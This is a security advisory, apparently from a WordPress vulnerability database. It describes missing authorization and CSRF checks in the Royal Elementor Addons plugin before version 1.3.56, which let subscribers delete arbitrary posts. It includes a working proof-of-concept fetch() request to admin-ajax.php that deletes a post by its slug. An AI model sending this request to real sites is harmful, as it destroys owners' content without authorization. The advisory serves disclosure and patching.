## WordPress Plugin Vulnerabilities

# Royal Elementor Addons < 1.3.56 - Subscriber+ Arbitrary Post Deletion

### Description

The plugin does not have authorization and CSRF checks when deleting a template and does not ensure that the post to be deleted is a template. This could allow any authenticated users, such as subscribers, to delete arbitrary posts assuming they know the related slug.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber
fetch('/wp-admin/admin-ajax.php?action=wpr\_delete\_template', {
method: 'POST',
headers: {"Content-Type": "application/x-www-form-urlencoded"},
body: 'template\_slug=hello-world&template\_library=post'
});
